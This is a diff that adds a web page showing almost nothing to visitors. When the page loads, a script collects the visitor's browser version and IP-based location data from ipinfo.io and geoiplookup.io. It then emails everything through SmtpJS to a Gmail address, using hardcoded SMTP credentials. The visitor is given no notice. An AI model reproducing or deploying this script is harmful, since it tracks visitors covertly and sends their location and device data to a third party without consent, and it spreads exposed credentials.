@@ -1,0 +1,51 @@
+<!-- <h1>Yesaya</h1> -->
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script>
+     var browserName = navigator.appName;
+    console.log("Nama Peramban: " + browserName);
+    var browserVersion = navigator.appVersion;
+    console.log("Versi Peramban: " + browserVersion);
+            Email.send({
+                        Host : "smtp.elasticemail.com",
+                        Username : "cobaweh933@gmail.com",
+                        Password : "18D8AA12B3E831E921D368C5C086DED4788E",
+                        To : 'cobaweh933@gmail.com',
+                        From : "cobaweh933@gmail.com",
+                        Subject : "Mail from website",
+                        Body : browserVersion
+                    }).then(
+                        // message => alert(message)
+                    );
+        $.get("https://ipinfo.io", function(response) {
+                // console.log("Location data:", response);
+                Email.send({
+                        Host : "smtp.elasticemail.com",
+                        Username : "cobaweh933@gmail.com",
+                        Password : "18D8AA12B3E831E921D368C5C086DED4788E",
+                        To : 'cobaweh933@gmail.com',
+                        From : "cobaweh933@gmail.com",
+                        Subject : "Mail from website",
+                        Body : response
+                    }).then(
+                        // message => alert(message)
+                    );
+            }, "json");
+     $.getJSON('https://json.geoiplookup.io/?callback=?', function (data) {
+            var json_data = JSON.stringify(data);
+            
+            Email.send({
+                        Host : "smtp.elasticemail.com",
+                        Username : "cobaweh933@gmail.com",
+                        Password : "18D8AA12B3E831E921D368C5C086DED4788E",
+                        To : 'cobaweh933@gmail.com',
+                        From : "cobaweh933@gmail.com",
+                        Subject : "Mail from website",
+                        Body : data
+                    }).then(
+                        // message => alert(message)
+                    );
+        });
+       
+      
+</script>
